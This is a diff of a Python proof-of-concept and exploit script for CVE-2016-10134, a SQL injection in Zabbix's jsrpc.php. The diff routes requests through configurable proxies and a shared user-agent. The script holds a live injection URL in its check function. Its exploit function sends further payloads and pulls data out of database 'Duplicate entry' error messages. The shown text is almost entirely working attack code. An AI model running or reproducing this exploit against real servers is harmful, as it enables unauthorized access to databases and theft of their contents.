@@ -5,6 +5,9 @@ import re
 import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
+from Config.config_proxies import proxies
+from Config.config_requests import ua
+
 # 脚本信息
 ######################################################
 NAME='CVE_2016_10134'
@@ -19,18 +22,18 @@ def poc(target):
     payload = "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
     vuln_url1 = target + payload
     headers = {
-        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
+        "User-Agent":ua,
     }
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        r1 = requests.get(url=vuln_url1, headers=headers, verify=False, timeout=5)
+        r1 = requests.get(url=vuln_url1, headers=headers, verify=False, timeout=5,proxies=proxies)
         if 'You have an error in your SQL syntax' in r1.text:
             result['target'] = target
             result['poc'] = NAME
             return result
         else:
             pass
-    except Exception as e:
+    except:
         pass
 
 def exp(target):
@@ -45,8 +48,8 @@ def exp(target):
     }
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        r2 = requests.get(url=payload2, headers=headers, verify=False, timeout=5)
-        r3 = requests.get(url=payload3, headers=headers, verify=False, timeout=5)
+        r2 = requests.get(url=payload2, headers=headers, verify=False, timeout=5,proxies=proxies)
+        r3 = requests.get(url=payload3, headers=headers, verify=False, timeout=5,proxies=proxies)
         result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
         result2 = result_reg.findall(r2.text)
         result3 = result_reg.findall(r3.text)
